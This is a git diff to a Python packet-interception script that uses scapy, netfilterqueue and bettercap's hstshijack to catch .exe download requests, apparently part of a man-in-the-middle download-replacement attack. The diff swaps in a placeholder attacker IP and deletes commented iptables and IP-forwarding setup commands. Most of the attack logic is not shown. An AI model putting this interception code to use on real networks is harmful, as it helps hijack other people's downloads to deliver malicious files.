@@ -13,7 +13,7 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 8080: # 8080 with bettercap -iface eth0 -caplet hstshijack/hstshijack
-            if b".exe" in scapy_packet[scapy.Raw].load and b"192.168.0.83" not in scapy_packet[scapy.Raw].load:
+            if b".exe" in scapy_packet[scapy.Raw].load and b"1.2.3.4" not in scapy_packet[scapy.Raw].load: # change IP Address 1.2.3.4 to Kali Machine
                 print("[+] exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
 
@@ -30,14 +30,3 @@ def process_packet(packet):
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
 queue.run()
-
-
-
-
-
-# service apache2 start
-# echo 1 > /proc/sys/net/ipv4/ip_forward
-# iptables -I FORWARD -j NFQUEUE --queue-num 0                 target
-# iptables -I OUTPUT -j NFQUEUE --queue-num 0                  local
-# iptables -I INPUT -j NFQUEUE --queue-num 0                   local
-# iptables --flush
